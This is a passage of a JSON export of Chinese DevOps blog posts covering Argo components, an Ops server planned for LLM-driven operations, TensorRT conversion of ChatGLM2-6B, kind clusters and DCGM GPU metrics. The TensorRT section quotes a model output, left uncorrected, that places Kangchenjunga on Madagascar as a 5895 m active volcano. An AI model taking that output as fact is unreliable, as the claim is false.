集群中的应用。\n2. argo-cd 2.1 安装 1 kubectl create namespace argocd 1 kubectl apply -n argocd -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/argoproj/v2.10.1-argo-cd.yaml 2.2 相关 CRD 列表 1 2 3 4 5 6 kubectl get crd |grep argo applications.argoproj.io 2024-02-23T01:49:08Z applicationsets.argoproj.io 2024-02-23T01:49:08Z appprojects.argoproj.io 2024-02-23T01:49:08Z ... applications.argoproj.io 这个 CRD 定义了 Argo CD 中的 Application 资源。Application 是 Argo CD 的核心概念之一，它代表了在 Kubernetes 集群中部署的一组资源（如 Pods、Services 等）的期望状态。Application 资源通常与 Git 仓库中的配置文件关联，允许用户通过 GitOps 的方式管理应用的部署和更新。\napplicationsets.argoproj.io ApplicationSet 是 Argo CD 的一个扩展，它提供了自动化和更灵活的管理能力，特别是在处理大量集群和单体仓库（monorepo）时。ApplicationSet 允许用户使用单个 Kubernetes 清单（manifest）来针对多个 Kubernetes 集群部署 Argo CD 应用。它还支持在多租户 Kubernetes 集群中，让单个集群租户使用 Argo CD 部署应用，而无需集群管理员介入。ApplicationSet 通过使用不同的生成器（如列表生成器、集群生成器、Git 生成器等）来生成参数，这些参数随后被用于模板渲染，从而创建或更新 Argo CD 应用。\nappprojects.argoproj.io AppProject 资源在 Argo CD 中用于逻辑上组织 Application 资源。它定义了一组应用可以部署到的 Git 仓库、目标集群和命名空间，以及这些应用的访问控制策略。AppProject 允许用户定义源仓库（sourceRepos）、目标集群（destinations）和角色（roles），这些角色定义了用户或服务账户对项目内资源的访问权限。这使得管理员可以更精细地控制谁可以部署哪些应用到哪些集群。\n3. argo-workflows 3.1 安装 1 kubectl create namespace argo 1 kubectl apply -n argo -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/argoproj/v3.5.4-argo-workflows.yaml 3.2 相关 CRD 1 2 3 4 5 6 7 8 9 10 11 kubectl get crd |grep argo clusterworkflowtemplates.argoproj.io 2024-02-23T01:25:07Z cronworkflows.argoproj.io 2024-02-23T01:25:07Z workflowartifactgctasks.argoproj.io 2024-02-23T01:25:07Z workfloweventbindings.argoproj.io 2024-02-23T01:25:07Z workflows.argoproj.io 2024-02-23T01:25:07Z workflowtaskresults.argoproj.io 2024-02-23T01:25:07Z workflowtasksets.argoproj.io 2024-02-23T01:25:07Z workflowtemplates.argoproj.io 2024-02-23T01:25:07Z ... clusterworkflowtemplates.argoproj.io ClusterWorkflowTemplate 是一种资源，它允许用户定义工作流模板，这些模板可以在集群范围内共享和重用。它类似于 WorkflowTemplate，但具有更高的权限级别，可以在任何命名空间中使用。\ncronworkflows.argoproj.io CronWorkflow 资源用于定义按计划执行的工作流。它类似于 Kubernetes 中的 CronJob，允许用户设置定时任务，以便在指定的时间间隔内自动启动工作流。\nworkflowartifactgctasks.argoproj.io WorkflowArtifactGCTask 是一种用于清理工作流执行后遗留的资源的任务。这有助于维护集群的整洁，避免资源泄露。\nworkfloweventbindings.argoproj.io WorkflowEventBinding 资源用于定义工作流事件的绑定，它允许用户根据 Kubernetes 事件（如 Pod 完成、ConfigMap 更新等）触发工作流的执行。\nworkflows.argoproj.io Workflow 是 Argo Workflows 中的核心资源类型，它定义了一个由多个步骤（任务）组成的工作流。每个步骤可以是一个容器、一个脚本或者其他类型的操作，它们按顺序或并行执行。\nworkflowtaskresults.argoproj.io WorkflowTaskResult 资源用于存储工作流任务的执行结果。这有助于在工作流中传递数据，或者在任务失败时进行调试。\nworkflowtasksets.argoproj.io WorkflowTasksSet 是一种资源，它允许用户定义一组工作流任务，这些任务可以作为模板在多个工作流中重用。\nworkflowtemplates.argoproj.io WorkflowTemplate 是一种资源，它定义了一个工作流模板，可以在特定命名空间内共享和重用。它类似于 ClusterWorkflowTemplate，但作用范围限制在单个命名空间内。\n4. argo-events 4.1 安装 1 kubectl create namespace argo-events 1 kubectl apply -n argo-events -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/argoproj/v1.9.1-argo-events.yaml 可选安装 validating webhook\n1 kubectl apply -n argo-events -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/argoproj/v1.9.1-argo-events-validating-webhook.yaml 4.2 相关 CRD 1 2 3 4 5 6 kubectl get crd |grep argo eventbus.argoproj.io 2024-02-23T01:35:46Z eventsources.argoproj.io 2024-02-23T01:35:46Z sensors.argoproj.io 2024-02-23T01:35:46Z ... eventbus.argoproj.io EventBus 是 Argo Events 中的一个核心资源，它负责在事件源（EventSources）和传感器（Sensors）之间传输事件。EventBus 可以基于 NATS Streaming 或 Kafka 构建，它提供了一种机制来确保事件在集群内可靠地传递。EventBus 资源定义了事件传输的配置，包括使用的后端消息系统、认证策略、持久化设置等。\neventsources.argoproj.io EventSource 资源定义了如何从外部服务（如 Kafka、GitHub、Slack 等）消费事件。它指定了事件源的类型、连接信息、过滤条件等。当观察到匹配过滤条件的事件时，EventSource 会将这些事件写入到 EventBus。EventSource 可以是原生的（如基于 NATS Streaming 的 EventSource）或者是异构的（如连接到现有的 Kafka 集群）。\nsensors.argoproj.io Sensor 资源定义了在 EventBus 上监听特定事件的逻辑，并在匹配事件时触发相应的响应。Sensor 运行在由 sensor-controller 管理的 Pod 中，它可以定义触发器（Triggers），这些触发器可以是 HTTP 请求、Kubernetes 对象操作、Slack 消息等。当 Sensor 观察到匹配的事件时，它会执行定义的操作，例如创建或更新 Kubernetes 资源。\n5. Argo rollouts 5.1 安装 1 kubectl create namespace argo-rollouts 1 kubectl apply -n argo-rollouts -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/argoproj/v1.6.6-argo-rollouts.yaml 可选安装 dashboard\n1 kubectl apply -n argo-rollouts -f https://raw.githubusercontent.com/shaowenchen/hubimage/main/argoproj/v1.6.6-argo-rollouts-dashboard.yaml 5.2 相关 CRD 1 2 3 4 5 6 7 8 kubectl get crd |grep argo analysisruns.argoproj.io 2024-02-23T02:24:15Z analysistemplates.argoproj.io 2024-02-23T02:24:15Z clusteranalysistemplates.argoproj.io 2024-02-23T02:24:15Z experiments.argoproj.io 2024-02-23T02:24:15Z rollouts.argoproj.io 2024-02-23T02:24:15Z ... analysisruns.argoproj.io AnalysisRun 资源用于定义和管理分析任务的执行。这些分析任务可以在部署过程中运行，以评估新版本的表现，例如通过比较新旧版本的指标。AnalysisRun 可以与 Experiment 资源关联，以在实验过程中执行分析。\nanalysistemplates.argoproj.io AnalysisTemplate 是一个模板资源，它定义了分析任务的配置，但不立即执行。AnalysisTemplate 可以被 AnalysisRun 引用，以便在需要时创建和执行分析任务。\nclusteranalysistemplates.argoproj.io ClusterAnalysisTemplate 类似于 AnalysisTemplate，但它具有集群范围的作用域。这意味着它可以在多个命名空间中被引用和使用，而不仅仅是在定义它的命名空间中。\nexperiments.argoproj.io Experiment 资源用于定义和管理实验，这些实验通常用于比较新旧版本的应用性能。Experiment 可以包含多个 AnalysisRun，以便在实验过程中执行多个分析任务。实验的结果可以用来决定是否将新版本推广到生产环境。\nrollouts.argoproj.io Rollout 是 Argo Rollouts 中的核心资源类型，它用于定义和管理应用的渐进式部署。Rollout 允许用户逐步将新版本的应用推送到生产环境，同时监控部署过程中的指标，以确保新版本的稳定性。Rollout 支持多种策略，如金丝雀发布、蓝绿部署等。\n","description":"","id":67,"section":"post","tags":["博文","CD","Argo"],"title":"Argo 核心组件介绍","uri":"https://www.chenshaowen.com/blog/introduction-to-argo-core-components.html"},{"content":"1. 什么是 Ops 项目 我在之前的文章中介绍过一个常用的 Ops 工具。\nOps 的设计理念在于，运维工具的核心在于文本分发和脚本执行，实现了这两种能力就能够满足运维的功能诉求。\n目前我主要的运维对象是 Host 主机、Kubernetes 集群，因此在 OpsObject 层实现了 Host 和 Cluster 对象，分别对应主机和 Kubernetes 集群。\n在此之上，分别实现了面向主机的文件分发、脚本执行，以及面向 Kubernetes 集群的文件分发、脚本执行，也就是 Core 核心能力层。\n得益于 Core 层的能力，我已经可以实现一些简单的运维功能，比如：批量添加 hosts，批量安装、变更 Prometheus 等。\n2. Ops Server 和 UI 功能 在上面的架构中，我提供了三个入口，：opscli、opsserver、opscontroller。\n由于之前工作需求已经完成了 opscli、opscontroller 两个组件，近期补齐了 opsserver 项目的部分功能和一个简单的 UI 界面。通过 helm charts 的方式，已经可以直接安装，详情参考 https://www.chenshaowen.com/ops/ 。\n下面是一些功能截图:\n查看托管的主机列表 Ops 会自动从主机上定时同步信息，比如: 主机名、CPU、内存、磁盘、系统信息等。\n查看托管的集群 Ops 会自动从集群上定时同步信息，比如: 版本、节点数量、Pod 的状态、证书过期时间等。\n查看 Task 对象 Task 是我定位的复用级对象，能够沉淀并共享运维能力，实现标准化操作。\n通过 Task 指定具体的主机或者集群，设置变量值，创建 TaskRun 对象就能够实现运维任务的执行。另外，Task 也支持定时执行。\n查看 TaskRun 对象 TaskRun 对象包含了任务的基本信息，包括: 任务名称、具体操作、执行结果等。\n3. 下一步 目前 Server 端的迭代主要依赖于 Copilot 项目的诉求。\nLLM 擅长分析并回答问题，得到一个解决方案或者一系列的 Command，但 LLM 并不能直接执行这些 Command。如上图，Ops Server 接下来的迭代的目标就是对接好 LLM ，让 LLM 能够读懂 Ops Server 的设计意图，在输出 Command 之后，能够直接转换为具有真实影响的 Action，让 LLM 具备真正的运维能力。\n这种设计的意义在于:\n不必在本地执行命令、配置凭证 支持批量的主机、集群操作 远程执行环境约束力更强，更加安全可审计 远端能够配置实现一些更加灵活、复杂的操作 简单点理解就是 Ops Server 会提供一种远端的运维能力，通过 API 对接到 LLM 应用中实现运维的自动化。\n","description":"","id":68,"section":"post","tags":["博文","Ops","Copilot","Kubernetes","运维"],"title":"Ops 新增 Server 及 UI 服务","uri":"https://www.chenshaowen.com/blog/ops-added-server-and-ui-services.html"},{"content":"1. 什么是 TensorRT TensorRT 是一个 C++ 库，主要用在 NVIDIA GPU 进行高性能的推理加速上，提供了 C++ API 和 Python API 用于集成。\nTensorRT 支持的主流深度学习框架有:\nCaffe，TensorRT 可以直接读取 prototxt 格式 TensorFlow，需要将 TensorFlow 的 pb 转换为 uff 格式 PyTorch，需要将 PyTorch 的 pth 格式转换为 onnx 格式 MXNet，需要将 MxNet 的 params 格式转换为 onnx 格式 TensorRT 是专门针对 NVIDIA GPU 的推理引擎，并不适用于其他厂商。\n另外，TensorRT 也不是完全开源的，核心的运行时库 libnvinfer.so 是闭源的，只有相关的周边库、API 才是开源的。\n2. TensorRT 优化原理 合并层 在推理时，大量时间浪费在 CUDA 核心的启动和每层输入输出的读写上，造成内存带宽瓶颈和 GPU 资源的浪费。\nTensorRT 可通过层间的横向、纵向融合成一个 CBR (Convolution-BatchNorm-ReLU) 层，模型层级少，GPU 核心利用率高，从而提高推理性能。\n量化 在训练模型，网络中的参数精度通常为 FP32，32 位浮点数的推理性能很低，占用大量的 GPU 内存。但推理时，由于不需要反向传播，可以适当降低参数精度，从而提高推理性能。\nTensorRT 对这一量化过程提供了自动化的支持，能够减少模型精度损失的同时，提高推理性能。\nkernel 自动调优 TensorRT 能根据不同显卡架构、SM 数量、内核频率等，选择最合适的的策略和计算方式。\n动态张量显存 TensorRT 在运行时，动态分配显存，以提高显存的利用率，支持更大的网络。\nMulti-Stream 并行 TensorRT 支持在同一个 GPU 上执行多个 Stream，同时操作，提高 GPU 的利用率。\n3. 模型转换为 TensorRT 3.1 PyTorch PyTorch 采用的是动态的计算图。将 PyTorch 模型转为 ONNX 时，需要调用 PyTorch 的 torch.onnx.export 函数。将 PyTorch 模型转为 ONNX 时，有两种方法：\ntrace，跟踪法 通过实际运行一遍模型的方法导出模型的静态图，但无法识别出模型中的控制流，如循环等。导出的思路就是让模型进行一次推理，记录下计算图。trace 导出的是静态图，推理引擎执行的效率更高。\nscript，脚本法 通过解析模型来记录所有的计算过程。\n3.2 TensorFlow TensorFlow 采用的是静态的计算图，本身具有图的完整结构。\n由于 ckpt 格式有很多冗余的信息，pb 格式体积更小，通常会先将模型转为 pb。而 pb 的计算图优化不如 uff 好，效率低。因此，又会先转 uff，再转 TensorRT 。\n4. PyTorch 转 ONNX 转 TensorRT 下载模型 1 docker run -v $PWD:/runtime shaowenchen/huggingface-cli download --resume-download --local-dir-use-symlinks False THUDM/ChatGLM2-6B --local-dir ChatGLM2-6B 下载转换脚本 在 Pytorch 转换为 ONNX 格式时，只需要执行 torch.onnx.export 函数即可。但经常会遇到一些，算子不支持、RuntimeError、ShapeError 等问题，这就需要对模型参数、算子进行调试。网上会有些分享，并经过验证的脚本，可以用来转换指定的一些模型。\n1 git clone https://github.com/luchangli03/export_llama_to_onnx 转换为 ONNX 格式 1 pip install numpy transformers torch==2.1 onnx -i https://pypi.tuna.tsinghua.edu.cn/simple 1 2 3 4 5 6 7 8 9 python3 export_llama_to_onnx/export_chatglm2.py -m ChatGLM2-6B -o ./ChatGLM2-6B-onnx -p float16 -d cuda begin load model from chatglm2-6b Loading checkpoint shards: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 7/7 [00:19\u0026lt;00:00, 2.78s/it] convert model to float16 convert model to cuda finish load model from chatglm2-6b begin export chat_glm_model layer_num: 28 在 ./ChatGLM2-6B-onnx 目录下会生成大量 .onnx 后缀的文件。\n校验模型 1 2 3 4 5 6 7 8 9 10 import onnx try: onnx.checker.check_model(\u0026#34;./ChatGLM2-6B-onnx/chat_glm_model.onnx\u0026#34;) onnx_model = onnx.load(\u0026#34;./ChatGLM2-6B-onnx/chat_glm_model.onnx\u0026#34;) print(\u0026#34;ONNX Version:\u0026#34;, onnx_model.ir_version) except Exception as e: print(\u0026#34;Model incorrect: {}\u0026#34;.format(e)) else: print(\u0026#34;Model correct\u0026#34;) 此时应该输出\n1 2 ONNX Version: 8 Model correct 可视化 ONNX 模型 1 pip install netron 1 netron --host 0.0.0.0 -p 8080 ./ChatGLM2-6B-onnx/chat_glm_model.onnx 访问 http://localhost:8080/ 查看模型结构。\nONNX 转 TensorRT 进入容器编译环境\n1 docker run --gpus device=all -v $PWD:/workspace -it --rm hubimage/nvidia-tensorrt:23.12-py3 bash 开始转换\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 trtexec --onnx=./ChatGLM2-6B-onnx/chat_glm_model.onnx --saveEngine=./ChatGLM2-6B-trt-engines/chat_glm_model.engine [02/04/2024-07:25:07] [I] === Performance summary === [02/04/2024-07:25:07] [I] Throughput: 63.7494 qps [02/04/2024-07:25:07] [I] Latency: min = 15.8738 ms, max = 16.2778 ms, mean = 15.935 ms, median = 15.9253 ms, percentile(90%) = 15.9812 ms, percentile(95%) = 16.0046 ms, percentile(99%) = 16.1168 ms [02/04/2024-07:25:07] [I] Enqueue Time: min = 2.09204 ms, max = 6.43628 ms, mean = 3.0315 ms, median = 2.94957 ms, percentile(90%) = 3.47656 ms, percentile(95%) = 4.021 ms, percentile(99%) = 4.52615 ms [02/04/2024-07:25:07] [I] H2D Latency: min = 0.18042 ms, max = 0.573242 ms, mean = 0.206923 ms, median = 0.194153 ms, percentile(90%) = 0.258423 ms, percentile(95%) = 0.273682 ms, percentile(99%) = 0.375793 ms [02/04/2024-07:25:07] [I] GPU Compute Time: min = 15.5573 ms, max = 15.6531 ms, mean = 15.6016 ms, median = 15.6018 ms, percentile(90%) = 15.6212 ms, percentile(95%) = 15.6265 ms, percentile(99%) = 15.6391 ms [02/04/2024-07:25:07] [I] D2H Latency: min = 0.12439 ms, max = 0.132263 ms, mean = 0.12646 ms, median = 0.126465 ms, percentile(90%) = 0.12793 ms, percentile(95%) = 0.128418 ms, percentile(99%) = 0.131042 ms [02/04/2024-07:25:07] [I] Total Host Walltime: 3.04316 s [02/04/2024-07:25:07] [I] Total GPU Compute Time: 3.02671 s [02/04/2024-07:25:07] [I] Explanations of the performance metrics are printed in the verbose logs. [02/04/2024-07:25:07] [I] \u0026amp;\u0026amp;\u0026amp;\u0026amp; PASSED TensorRT.trtexec [TensorRT v8601] # trtexec --onnx=./ChatGLM2-6B-onnx/chat_glm_model.onnx --saveEngine=./ChatGLM2-6B-trt-engines/chat_glm_model.engine 会有一些性能测试的结果信息，P95、P99 等以供参考。\n查看输出的 TensorRT 模型 1 2 3 ls -alh ./ChatGLM2-6B-trt-engines/chat_glm_model.engine -rw-r--r-- 1 root root 24G Feb 4 07:24 ./ChatGLM2-6B-trt-engines/chat_glm_model.engine 但对于大模型来说，使用 TensorRT-LLM 进行转换会是一个更好的选择，不仅仅是转换的成功率、效率，还有转换之后也更好部署与 Triton 进行集成。\n5. TensorRT-LLM 转 TensorRT 进入编译环境 1 docker run --gpus device=0 -v $PWD:/app/tensorrt_llm/models -it --rm hubimage/nvidia-tensorrt-llm:v0.7.1 bash 转换 TensorRT 模型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 python examples/chatglm/build.py --model_dir ./models/ChatGLM2-6B \\ --model_name chatglm2_6b \\ --dtype float16 \\ --parallel_build \\ --use_inflight_batching \\ --enable_context_fmha \\ --use_gemm_plugin float16 \\ --use_gpt_attention_plugin float16 \\ --output_dir ./models/ChatGLM2-6B-trt-engines [02/05/2024-02:50:58] [TRT] [I] [MemUsageChange] TensorRT-managed allocation in engine deserialization: CPU +0, GPU +11908, now: CPU 0, GPU 11908 (MiB) [02/05/2024-02:50:58] [TRT-LLM] [I] Activation memory size: 210.50 MiB [02/05/2024-02:50:58] [TRT-LLM] [I] Weights memory size: 11909.66 MiB [02/05/2024-02:50:58] [TRT-LLM] [I] Max KV Cache memory size: 448.00 MiB [02/05/2024-02:50:58] [TRT-LLM] [I] Estimated max memory usage on runtime: 12568.16 MiB [02/05/2024-02:50:58] [TRT-LLM] [I] Serializing engine to models/ChatGLM2-6B-trt-engines/chatglm2_6b_float16_tp1_rank0.engine... [02/05/2024-02:51:03] [TRT-LLM] [I] Engine serialized. Total time: 00:00:04 [02/05/2024-02:51:03] [TRT] [I] Serialized 59 bytes of code generator cache. [02/05/2024-02:51:03] [TRT] [I] Serialized 35129 bytes of compilation cache. [02/05/2024-02:51:03] [TRT] [I] Serialized 315 timing cache entries [02/05/2024-02:51:03] [TRT-LLM] [I] Timing cache serialized to model.cache [02/05/2024-02:51:05] [TRT-LLM] [I] Total time of building all 1 engines: 00:00:55 测试模型 1 2 3 4 5 6 7 8 python examples/run.py --input_text \u0026#34;世界上第三高的山峰是哪座？\u0026#34; \\ --max_output_len=200 \\ --tokenizer_dir ./models/ChatGLM2-6B \\ --engine_dir=./models/ChatGLM2-6B-trt-engines/ [02/05/2024-02:55:55] [TRT-LLM] [W] Found pynvml==11.4.1. Please use pynvml\u0026gt;=11.5.0 to get accurate memory usage Input [Text 0]: \u0026#34;世界上第三高的山峰是哪座？\u0026#34; Output [Text 0 Beam 0]: \u0026#34;世界上第三高的山峰是干城章嘉峰，它位于印度洋上的马达加斯加岛。这座山峰高5895米，被誉为“火山中的活火山” 6. 总结 TensorRT 是 NVIDIA 推出的用于在 GPU 上进行高性能推理加速的 C++ 库，通过层合并、量化、Kernel 优化等技术提升推理性能。\nTensorRT 支持主流深度学习框架模型的转化，如 PyTorch 到 ONNX 然后到 TensorRT，转换过程中可能需要处理某些算子不支持的问题。\nPyTorch 可以通过 trace 或 script 两种方法导出 ONNX 模型。\nTensorFlow 模型可以通过 ckpt-\u0026gt;pb-\u0026gt;uff-\u0026gt;TensorRT 的转换链实现转化。\nTensorRT-LLM 是 NVIDIA 推出的用于大模型推理加速的 TensorRT 解决方案，如果是大模型使用 TensorRT-LLM 是一个更好的选择。\n","description":"","id":69,"section":"post","tags":["博文","AI","TensorRT","NVIDIA","推理"],"title":"使用 TensorRT 加速模型推理","uri":"https://www.chenshaowen.com/blog/speeding-up-model-inference-with-tensorrt.html"},{"content":"1. 项目简介 kind 是使用容器管理 Kubernetes 集群的工具。项目地址 https://github.com/kubernetes-sigs/kind 。\n主要用在:\n本地开发环境 学习时的临时环境 自动化测试 2. 安装 kind macOS 1 brew install kind Linux 1 2 curl -Lo /usr/local/bin/kind https://kind.sigs.k8s.io/dl/v0.21.0/kind-linux-amd64 chmod +x /usr/local/bin/kind 3. 创建 kind 集群 如果你本地配置有 PROXY，在创建之间建议重新设置一下环境变量：\n1 2 export https_proxy=http://x.x.x.x:7890 export http_proxy=http://x.x.x.x:7890 本地代理通常设置为 http://127.0.0.1:7890，但 kind 访问不到，需要改成当前主机的 IP 地址 http://x.x.x.x:7890 。否则在部署应用时，会报错拉取不到镜像。\n3.1 单节点 创建单节点集群 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kind create cluster --image=kindest/node:v1.23.6 --name=dev Creating cluster \u0026#34;dev\u0026#34; ... ✓ Ensuring node image (kindest/node:v1.23.6) 🖼 ✓ Preparing nodes 📦 ✓ Writing configuration 📜 ✓ Starting control-plane 🕹️ ✓ Installing CNI 🔌 ✓ Installing StorageClass 💾 Set kubectl context to \u0026#34;kind-dev\u0026#34; You can now use your cluster with: kubectl cluster-info --context kind-dev Have a nice day! 👋 查看集群 1 2 3 4 kubectl get node NAME STATUS ROLES AGE VERSION dev-control-plane Ready control-plane,master 71s v1.23.6 3.2 多节点 编辑配置文件 dev-multi-node.yaml 1 2 3 4 5 6 7 8 9 kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 nodes: - role: control-plane image: kindest/node:v1.23.6 - role: worker image: kindest/node:v1.23.6 - role: worker image: kindest/node:v1.23.6 创建多节点集群 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 kind create cluster --config dev-multi-node.yaml --name=dev-multi-node Creating cluster \u0026#34;dev-multi-node\u0026#34; ... ✓ Ensuring node image (kindest/node:v1.23.6) 🖼 ✓ Preparing nodes 📦 📦 📦 ✓ Writing configuration 📜 ✓ Starting control-plane 🕹️ ✓ Installing CNI 🔌 ✓ Installing StorageClass 💾 ✓ Joining worker nodes 🚜 Set kubectl context to \u0026#34;kind-dev-multi-node\u0026#34; You can now use your cluster with: kubectl cluster-info --context kind-dev-multi-node Thanks for using kind! 😊 查看集群 1 2 3 4 5 6 kubectl get node NAME STATUS ROLES AGE VERSION dev-multi-node-control-plane Ready control-plane,master 2m45s v1.23.6 dev-multi-node-worker Ready \u0026lt;none\u0026gt; 2m23s v1.23.6 dev-multi-node-worker2 Ready \u0026lt;none\u0026gt; 2m23s v1.23.6 4. kind 集群生命周期管理 查看集群 1 2 3 4 kind get clusters dev dev-multi-node 切换集群 注意这里的 context 的 kind-{集群名} 的格式。\n1 kubectl cluster-info --context kind-dev 删除集群 1 kind delete cluster --name dev-multi-node 5. 端口映射到主机 1 2 3 4 5 6 7 8 9 kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 nodes: - role: control-plane extraPortMappings: - containerPort: 30000 hostPort: 8000 listenAddress: \u0026#34;0.0.0.0\u0026#34; protocol: tcp 在创建 kind 集群时，添加 extraPortMappings 参数，指定容器端口映射到主机端口。这里就是将 kind 集群的 30000 端口映射到本机 8000 端口。\n6. 加载镜像到集群 1 kind load docker-image test:v1 --name dev 将本地构建的镜像，加载到 kind 集群中。\n7. 配置网络 1 2 3 4 5 6 7 8 9 10 11 12 kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 networking: ipFamily: ipv4 apiServerPort: -1 apiServerAddress: 127.0.0.1 podSubnet: \u0026#34;10.244.0.0/16\u0026#34; serviceSubnet: \u0026#34;10.96.0.0/16\u0026#34; disableDefaultCNI: false kubeProxyMode: \u0026#34;iptables\u0026#34; dnsSearch: - cluster.local 8. 配置运行时 1 2 3 4 5 6 kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 containerdConfigPatches: - |- [plugins.\u0026#34;io.containerd.grpc.v1.cri\u0026#34;.registry.mirrors.\u0026#34;registry-1.docker.io\u0026#34;] endpoint = [\u0026#34;https://docker.nju.edu.cn\u0026#34;] 这里给 containerd 配置了国内的镜像仓库 mirror 。\n9. 开启 FeatureGates 1 2 3 4 kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 featureGates: \u0026#34;AdmissionWebhookMatchConditions\u0026#34;: true 参考 https://kubernetes.io/docs/reference/command-line-tools-reference/feature-gates/ 开启 FeatureGates 。\n10 挂载主机目录到集群 1 2 3 4 5 6 7 kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 nodes: - role: control-plane extraMounts: - hostPath: /Users/shaowenchen/kind-host containerPath: /host 将主机的目录 /Users/shaowenchen/kind-host 挂载到 kind 集群指定节点的 /host 。\n11. 参考 https://kind.sigs.k8s.io/docs/ ","description":"","id":70,"section":"post","tags":["博文","Kubernetes","kind","实践"],"title":"kind 实用指南","uri":"https://www.chenshaowen.com/blog/practice-guide-to-kind.html"},{"content":"1. dcgm-exporter dcgm-exporter 是 NVIDIA 官方社区提供的 GPU 监控工具。\n项目地址 https://github.com/NVIDIA/dcgm-exporter\n1.1 安装方式 添加 Helm 镜像仓库 1 helm repo add gpu-helm-charts https://nvidia.github.io/dcgm-exporter/helm-charts 1 helm repo update 安装 1 2 3 4 5 6 helm install dcgm-exporter gpu-helm-charts/dcgm-exporter --namespace monitor --create-namespace \\ --set serviceMonitor.enabled=false \\ --set image.repository=hubimage/nvidia-dcgm-exporter \\ --set image.tag=3.3.3-3.3.0-ubuntu22.04 \\ --set nodeSelector.\u0026#34;accelerator\\/provider\u0026#34;=nvidia-gpu \\ --version 3.3.1 需要给 NVIDIA GPU 节点打上标签\n1 kubectl label node \u0026lt;node-name\u0026gt; accelerator/provider=nvidia-gpu 1.2 指标 GPU 利用率 指标名称 指标类型 单位 描述 DCGM_FI_DEV_GPU_UTIL Gauge % GPU 利用率 DCGM_FI_DEV_MEM_COPY_UTIL Gauge % GPU 内存复制利用率 DCGM_FI_DEV_ENC_UTIL Gauge % GPU 编码器利用率 DCGM_FI_DEV_DEC_UTIL Gauge % GPU 解码器利用率 内存 指标名称 指标类型 单位 描述 DCGM_FI_DEV_FB_FREE Gauge MiB GPU 帧缓存剩余量 DCGM_FI_DEV_FB_USED Gauge MiB GPU 帧缓存使用量 以下是您提供的指标信息的 Markdown 表格：\n频率 指标名称 指标类型 单位 描述 DCGM_FI_DEV_SM_CLOCK Gauge MHz GPU SM 时钟频率 DCGM_FI_DEV_MEM_CLOCK Gauge MHz GPU 内存时钟频率 剖析 指标名称 指标类型 单位 描述 DCGM_FI_PROF_GR_ENGINE_ACTIVE Gauge % 在一个时间间隔内，Graphics 或 Compute 引擎处于 Active 的时间占比 DCGM_FI_PROF_SM_ACTIVE Gauge % 在一个时间间隔内，至少一个线程束在一个 SM 上处于 Active 的时间占比（均值） DCGM_FI_PROF_SM_OCCUPANCY Gauge % 在一个时间间隔内，驻留在 SM 上的线程束与该 SM 最大可驻留线程束的比例（均值） DCGM_FI_PROF_PIPE_TENSOR_ACTIVE Gauge % 单位时间内 Tensor Pipes 平均处于 Active 状态的周期分数 DCGM_FI_PROF_DRAM_ACTIVE Gauge % 内存拷贝活跃周期分数（一个周期内有一次 DRAM 指令则该周期为 100%） DCGM_FI_PROF_PIPE_FP64_ACTIVE Gauge % 单位时间内 F64 Pipes 平均处于 Active 状态的周期分数 DCGM_FI_PROF_PIPE_FP32_ACTIVE Gauge % 单位时间内 F32 Pipes 平均处于 Active 状态的周期分数 DCGM_FI_PROF_PIPE_FP16_ACTIVE Gauge % 单位时间内 F16 Pipes 平均处于 Active 状态的周期分数 DCGM_FI_PROF_NVLINK_RX_BYTES Counter B/s 通过 NVLink 接收的数据流量 DCGM_FI_PROF_NVLINK_TX_BYTES Counter B/s 通过 NVLink 传输的数据流量 DCGM_FI_PROF_PCIE_RX_BYTES Counter B/s 通过 PCIe 总线接收字节数 DCGM_FI_PROF_PCIE_TX_BYTES Counter B/s 通过 PCIe 总线传输字节数 DCGM_FI_DEV_PCIE_REPLAY_COUNTER Counter 次 GPU PCIe 总线的重试次数 DCGM_FI_DEV_NVLINK_BANDWIDTH_TOTAL Counter - GPU 所有通道的 NVLink 带宽计数器总数 温度和功率 指标名称 指标类型 单位 描述 DCGM_FI_DEV_GPU_TEMP Gauge ℃ GPU 当前温度 DCGM_FI_DEV_MEMORY_TEMP Gauge ℃ GPU 显存当前温度 DCGM_FI_DEV_POWER_USAGE Gauge W GPU 当前使用功率 DCGM_FI_DEV_TOTAL_ENERGY_CONSUMPTION Counter mJ GPU 启动以来的总能耗 XID 错误\u0026amp;违规 指标名称 指标类型 单位 描述 DCGM_FI_DEV_XID_ERRORS Gauge - 最近发生的错误代码 DCGM_CUSTOM_XID_ERRORS_TOTAL_COUNTER Counter - 发生错误代码总数 DCGM_FI_DEV_POWER_VIOLATION Counter μs 因功率上限而导致违规的累积持续时间 DCGM_FI_DEV_THERMAL_VIOLATION Counter μs 因热限制导致违规的累积持续时间 DCGM_FI_DEV_SYNC_BOOST_VIOLATION Counter μs 因同步提升限制而导致违规的累积持续时间 DCGM_FI_DEV_BOARD_LIMIT_VIOLATION Counter μs 因电路板限制而导致违规的累积持续时间 DCGM_FI_DEV_LOW_UTIL_VIOLATION Counter μs 因低利用率限制导致违规的累积持续时间 DCGM_FI_DEV_RELIABILITY_VIOLATION Counter μs 因电路板可靠性限制导致违规的累积持续时间 停用的内存页面 指标名称 指标类型 单位 描述 DCGM_FI_DEV_RETIRED_SBE Counter 个 因单 bit 错误而停用的内存页面 DCGM_FI_DEV_RETIRED_DBE Counter 个 因双 bit 错误而停用的内存页面 其他 指标名称 指标类型 单位 描述 DCGM_FI_DEV_VGPU_LICENSE_STATUS Gauge - vGPU 许可证状态 DCGM_FI_DEV_UNCORRECTABLE_REMAPPED_ROWS Counter - 因无法纠正的错误而重新映射的行数 DCGM_FI_DEV_CORRECTABLE_REMAPPED_ROWS Counter - 因可纠正的错误而重新映射的行数 DCGM_FI_DEV_ROW_REMAP_FAILURE Gauge 2. npu-exporter NPU-Expoter 